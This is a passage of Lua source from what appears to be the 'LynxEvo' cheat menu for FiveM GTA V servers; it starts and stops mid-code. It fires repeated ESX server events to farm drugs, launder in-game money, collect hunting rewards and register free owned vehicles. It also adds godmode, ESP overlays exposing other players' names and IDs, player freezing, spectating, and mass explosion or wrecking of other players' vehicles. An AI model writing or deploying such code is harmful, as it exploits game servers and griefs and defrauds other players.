		IsEntityPlayingAnim(PlayerPedId(), "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a", "idle_a", 3) then end end; ClearPedTasks(PlayerPedId()) end)
	else DeleteEntity(LynxEvo.TabletEntity) end end;
	LynxEvo.ToggleCamera = function(cq) if not true then
	return end;
	if cq then
	if not DoesEntityExist(LynxEvo.Entity) then
	return end;
	if DoesCamExist(LynxEvo.Camera) then DestroyCam(LynxEvo.Camera) end;
	LynxEvo.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true) AttachCamToEntity(LynxEvo.Camera, LynxEvo.Entity, 0.0, 0.0, 0.4, true) Citizen.CreateThread(function() while DoesCamExist(LynxEvo.Camera) do Citizen.Wait(5) SetCamRot(LynxEvo.Camera, GetEntityRotation(LynxEvo.Entity)) end end) local cr = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10) RenderScriptCams(1, 1, cr, 1, 1) Citizen.Wait(cr) SetTimecycleModifier("scanline_cam_cheap") SetTimecycleModifierStrength(2.0)
	else local cr = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) / 10) RenderScriptCams(0, 1, cr, 1, 0) Citizen.Wait(cr) ClearTimecycleModifier() DestroyCam(LynxEvo.Camera) end end;
	LynxEvo.LoadModels = function(cs) for ct = 1, #cs do local bB = cs[ct]
		if
	not LynxEvo.CachedModels then LynxEvo.CachedModels = {}
	end;
	table.insert(LynxEvo.CachedModels, bB) if IsModelValid(bB) then
	while not HasModelLoaded(bB) do RequestModel(bB) Citizen.Wait(10) end
		else
			while not HasAnimDictLoaded(bB) do RequestAnimDict(bB) Citizen.Wait(10) end end end end;
			LynxEvo.UnloadModels = function() for ct = 1, #LynxEvo.CachedModels do local bB = LynxEvo.CachedModels[ct]
			if
	IsModelValid(bB) then SetModelAsNoLongerNeeded(bB)
	else RemoveAnimDict(bB) end end end;
	local
	function cu() local ax = GetPlayerPed(-1) local ay = GetVehiclePedIsIn(ax, true) local m = KeyboardInput("Enter the plate license you want", "", 100) if m ~= ""
	then SetVehicleNumberPlateText(ay, m) end end;

	function hweed() TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestWeed") end;

	function tweed() TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformWeed") end;

	function sweed() TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellWeed") end;

	function hcoke() TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestCoke") end;

	function tcoke() TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformCoke") end;

	function scoke() TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellCoke") end;

	function hmeth() TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startHarvestMeth") end;

	function tmeth() TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformMeth") end;

	function smeth() TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellMeth") end;

	function hopi() TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") TriggerServerEvent("esx_drugs:startHarvestOpium") end;

	function topi() TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformOpium") end;

	function sopi() TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") TriggerServerEvent("esx_drugs:startSellOpium") end;

	function mataaspalarufe() TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) TriggerServerEvent("esx_blanchisseur:startWhitening", 85) end;

	function matanumaispalarufe() TriggerServerEvent("esx_drugs:stopHarvestCoke") TriggerServerEvent("esx_drugs:stopTransformCoke") TriggerServerEvent("esx_drugs:stopSellCoke") TriggerServerEvent("esx_drugs:stopHarvestMeth") TriggerServerEvent("esx_drugs:stopTransformMeth") TriggerServerEvent("esx_drugs:stopSellMeth") TriggerServerEvent("esx_drugs:stopHarvestWeed") TriggerServerEvent("esx_drugs:stopTransformWeed") TriggerServerEvent("esx_drugs:stopSellWeed") TriggerServerEvent("esx_drugs:stopHarvestOpium") TriggerServerEvent("esx_drugs:stopTransformOpium") TriggerServerEvent("esx_drugs:stopSellOpium") av("~b~Everything is now stopped.", false) end;
	local
	function cv() local cb = KeyboardInput("Enter Vehicle Spawn Name", "", 100) local cw = KeyboardInput("Enter Vehicle Licence Plate", "", 100) if cb and IsModelValid(cb) and IsModelAVehicle(cb) then RequestModel(cb) while not HasModelLoaded(cb) do Citizen.Wait(0) end;
		local veh = CreateVehicle(GetHashKey(cb), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true) SetVehicleNumberPlateText(veh, cw) local cx = ESX.Game.GetVehicleProperties(veh) TriggerServerEvent("esx_vehicleshop:setVehicleOwned", cx) av("~g~~h~Success", false)
	else av("~b~~h~Model is not valid !", true) end end;

	function daojosdinpatpemata() local ax = GetPlayerPed(-1) local ay = GetVehiclePedIsIn(ax, true) if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then SetVehicleOnGroundProperly(ay) av("~g~Vehicle Flipped!", false)
	else av("~b~You Aren't In The Driverseat Of A Vehicle!", true) end end;

	function stringsplit(cy, cz) if cz == nil then cz = "%s"
	end;
	local cA = {}
	i = 1;
	for cB in string.gmatch(cy, "([^"..cz..
			"]+)") do cA[i] = cB;
		i = i + 1 end;
	return cA end;
	local cC = false;

	function SpectatePlayer(cD) local ax = PlayerPedId(-1) cC = not cC;
	local cE = GetPlayerPed(cD) if cC then local cF, cG, cH = table.unpack(GetEntityCoords(cE, false)) RequestCollisionAtCoord(cF, cG, cH) NetworkSetInSpectatorMode(true, cE) av("Spectating "..GetPlayerName(cD), false)
	else local cF, cG, cH = table.unpack(GetEntityCoords(cE, false)) RequestCollisionAtCoord(cF, cG, cH) NetworkSetInSpectatorMode(false, cE) av("Stopped Spectating "..GetPlayerName(cD), false) end end;

	function ShootPlayer(cD) local head = GetPedBoneCoords(cD, GetEntityBoneIndexByName(cD, "SKEL_HEAD"), 0.0, 0.0, 0.0) SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true) end;

	function MaxOut(veh) SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true) ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false) SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true) SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false) SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true) SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true) SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255) end;

	function DelVeh(veh) SetEntityAsMissionEntity(Object, 1, 1) DeleteEntity(Object) SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1) DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false)) end;

	function Clean(veh) SetVehicleDirtLevel(veh, 15.0) end;

	function Clean2(veh) SetVehicleDirtLevel(veh, 1.0) end;

	function RequestControl(entity) local cI = 0;
	NetworkRequestControlOfEntity(entity) while not NetworkHasControlOfEntity(entity) do cI = cI + 100;
		Citizen.Wait(100) if cI > 5000 then av("Hung for 5 seconds, killing to prevent issues...", true) end end end;

	function getEntity(cD) local m, entity = GetEntityPlayerIsFreeAimingAt(cD, Citizen.ReturnResultAnyway()) return entity end;

	function GetInputMode() return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard"
	or "GamePad"
	end;

	function DrawSpecialText(cJ, cK) SetTextEntry_2("STRING") AddTextComponentString(cJ) DrawSubtitleTimed(cK, 1) end;
	local cL = true;
	local cM = false;
	local cN = true;
	local cO = true;
	Citizen.CreateThread(function() while true do Wait(1) for f = 0, 128 do
			if NetworkIsPlayerActive(f)
		and GetPlayerPed(f)  ~= GetPlayerPed(-1) then ped = GetPlayerPed(f) blip = GetBlipFromEntity(ped) x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true)) distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), false, false, "", false) wantedLvl = GetPlayerWantedLevel(f) if cM then Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true) if wantedLvl then Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true) Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
		else Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false) end
		else Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false) Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false) Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false) end;
		if cL then
		if not DoesBlipExist(blip) then blip = AddBlipForEntity(ped) SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, f)
		else veh = GetVehiclePedIsIn(ped, false) blipSprite = GetBlipSprite(blip) if not GetEntityHealth(ped) then
		if blipSprite ~= 274 then SetBlipSprite(blip, 274) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, f) end elseif veh then vehClass = GetVehicleClass(veh) vehModel = GetEntityModel(veh) if vehClass == 15 then
		if blipSprite ~= 422 then SetBlipSprite(blip, 422) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, f) end elseif vehClass == 16 then
		if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
		if blipSprite ~= 424 then SetBlipSprite(blip, 424) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, f) end elseif blipSprite ~= 423 then SetBlipSprite(blip, 423) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) end elseif vehClass == 14 then
		if blipSprite ~= 427 then SetBlipSprite(blip, 427) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) end elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("limo2") then
		if blipSprite ~= 426 then SetBlipSprite(blip, 426) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, f) end elseif vehModel == GetHashKey("rhino") then
		if blipSprite ~= 421 then SetBlipSprite(blip, 421) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, f) end elseif blipSprite ~= 1 then SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, f) end; passengers = GetVehicleNumberOfPassengers(veh) if passengers then
		if not IsVehicleSeatFree(veh, -1) then passengers = passengers + 1 end; ShowNumberOnBlip(blip, passengers)
		else HideNumberOnBlip(blip) end
		else HideNumberOnBlip(blip) if blipSprite ~= 1 then SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, f) end end; SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) SetBlipNameToPlayerName(blip, f) SetBlipScale(blip, 0.85) if IsPauseMenuActive() then SetBlipAlpha(blip, 255)
		else x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true)) distance = math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) + 900;
		if distance < 0 then distance = 0 elseif distance > 255 then distance = 255 end; SetBlipAlpha(blip, distance) end end
		else RemoveBlip(blip) end end end end end) local cP = {
		__gc = function(cQ) if cQ.destructor and cQ.handle then cQ.destructor(cQ.handle) end;
		cQ.destructor = nil;
		cQ.handle = nil end
	}

	function EnumerateEntities(cR, cS, cT) return coroutine.wrap(function() local cU, f = cR() if not f or f == 0 then cT(cU) return end; local cQ = {
			handle = cU, destructor = cT
		}
		setmetatable(cQ, cP) local cV = true; repeat coroutine.yield(f) cV, f = cS(cU) until not cV; cQ.destructor, cQ.handle = nil, nil; cT(cU) end) end;

	function EnumeratePeds() return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end;

	function EnumerateVehicles() return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end;

	function EnumerateObjects() return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject) end;

	function RotationToDirection(cW) local cX = cW.z * 0.0174532924;
	local cY = cW.x * 0.0174532924;
	local cZ = math.abs(math.cos(cY)) return vector3(-math.sin(cX) * cZ, math.cos(cX) * cZ, math.sin(cY)) end;

	function OscillateEntity(entity, c_, d0, d1, d2) if entity ~= 0 and entity ~= nil then local d3 = (d0 - c_) * d1 * d1 - 2.0 * d1 * d2 * GetEntityVelocity(entity) ApplyForceToEntity(entity, 3, d3.x, d3.y, d3.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true) end end;
	local d4 = true;
	Citizen.CreateThread(function() while bw do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), d4, 0) if SuperJump
		then SetSuperJumpThisFrame(PlayerId(-1)) end;
		if InfStamina then RestorePlayerStamina(PlayerId(-1), 1.0) end;
		if fastrun then SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49) SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
		else SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0) SetPedMoveRateOverride(GetPlayerPed(-1), 1.0) end;
		if VehicleGun then local d5 = "Freight"
		local c0 = GetEntityCoords(GetPlayerPed(-1), true) if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then av("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!", false) GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true) SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999) if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL") then
		if IsPedShooting(GetPlayerPed(-1)) then
		while not HasModelLoaded(GetHashKey(d5)) do Citizen.Wait(0) RequestModel(GetHashKey(d5)) end;
		local veh = CreateVehicle(GetHashKey(d5), c0.x + 5 * GetEntityForwardX(GetPlayerPed(-1)), c0.y + 5 * GetEntityForwardY(GetPlayerPed(-1)), c0.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true) SetEntityAsNoLongerNeeded(veh) SetVehicleForwardSpeed(veh, 150.0) end end end end;
		if DeleteGun then local d6 = getEntity(PlayerId(-1)) if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then av('~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!') GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true) SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999) if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
		if IsPlayerFreeAiming(PlayerId(-1)) then
		if IsEntityAPed(d6) then
		if IsPedInAnyVehicle(d6, true) then
		if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(GetVehiclePedIsIn(d6, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(d6, true)) SetEntityAsMissionEntity(d6, 1, 1) DeleteEntity(d6) av('~g~Deleted!') end
		else if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(d6, 1, 1) DeleteEntity(d6) av('~g~Deleted!') end end
		else if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(d6, 1, 1) DeleteEntity(d6) av('~g~Deleted!') end end end end end end;
		if fuckallcars then
		for ay in EnumerateVehicles() do
			if not
		IsPedAPlayer(GetPedInVehicleSeat(ay, -1)) then SetVehicleHasBeenOwnedByPlayer(ay, false) SetEntityAsMissionEntity(ay, false, false) StartVehicleAlarm(ay) DetachVehicleWindscreen(ay) SmashVehicleWindow(ay, 0) SmashVehicleWindow(ay, 1) SmashVehicleWindow(ay, 2) SmashVehicleWindow(ay, 3) SetVehicleTyreBurst(ay, 0, true, 1000.0) SetVehicleTyreBurst(ay, 1, true, 1000.0) SetVehicleTyreBurst(ay, 2, true, 1000.0) SetVehicleTyreBurst(ay, 3, true, 1000.0) SetVehicleTyreBurst(ay, 4, true, 1000.0) SetVehicleTyreBurst(ay, 5, true, 1000.0) SetVehicleTyreBurst(ay, 4, true, 1000.0) SetVehicleTyreBurst(ay, 7, true, 1000.0) SetVehicleDoorBroken(ay, 0, true) SetVehicleDoorBroken(ay, 1, true) SetVehicleDoorBroken(ay, 2, true) SetVehicleDoorBroken(ay, 3, true) SetVehicleDoorBroken(ay, 4, true) SetVehicleDoorBroken(ay, 5, true) SetVehicleDoorBroken(ay, 6, true) SetVehicleDoorBroken(ay, 7, true) SetVehicleLights(ay, 1) Citizen.InvokeNative(0x1FD09E7390A74D54, ay, 1) SetVehicleNumberPlateTextIndex(ay, 5) SetVehicleNumberPlateText(ay, "LynxMenu") SetVehicleDirtLevel(ay, 10.0) SetVehicleModColor_1(ay, 1) SetVehicleModColor_2(ay, 1) SetVehicleCustomPrimaryColour(ay, 255, 51, 255) SetVehicleCustomSecondaryColour(ay, 255, 51, 255) SetVehicleBurnout(ay, true) end end end;
		if destroyvehicles then
		for vehicle in EnumerateVehicles() do
			if vehicle ~=
		GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleUndriveable(vehicle, true) SetVehicleEngineHealth(vehicle, 0) end end end;
		if explodevehicles then
		for vehicle in EnumerateVehicles() do
			if vehicle ~=
		GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) NetworkExplodeVehicle(vehicle, true, true, false) end end end;
		if huntspam then Citizen.Wait(1) TriggerServerEvent('esx-qalle-hunting:reward', 20000) TriggerServerEvent('esx-qalle-hunting:sell') end;
		if deletenearestvehicle then
		for vehicle in EnumerateVehicles() do
			if vehicle ~=
		GetVehiclePedIsIn(GetPlayerPed(-1), false) then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(vehicle, true)) SetEntityAsMissionEntity(vehicle, 1, 1) DeleteEntity(vehicle) end end end;
		if freezeplayer then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer)) end;
		if freezeall then
		for i = 0, 128 do ClearPedTasksImmediately(GetPlayerPed(i)) end end;
		if esp then
		for i = 0, 128 do
			if i ~=
		PlayerId(-1) and GetPlayerServerId(i)  ~= 0 then local a8 = k(1.0) local d7 = GetPlayerPed(i) local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1))) local x, y, z = table.unpack(GetEntityCoords(d7)) local db = "~h~Name: "..GetPlayerName(i)..
		"\nServer ID: "..GetPlayerServerId(i)..
		"\nPlayer ID: "..i..
		"\nDist: "..math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1) if IsPedInAnyVehicle(d7, true) then local dc = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7)))) db = db..
		"\nVeh: "..dc end;
		if espinfo and esp then DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b) end;
		if espbox and esp then LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9) LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9) LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9) LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9) LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9) LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9) LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9) TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8) TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8) TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8) TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8) TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8) TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8) TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8) ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8) ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9) ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8) ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9) ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8) ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9) ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8) ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9) DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, a8.r, a8.g, 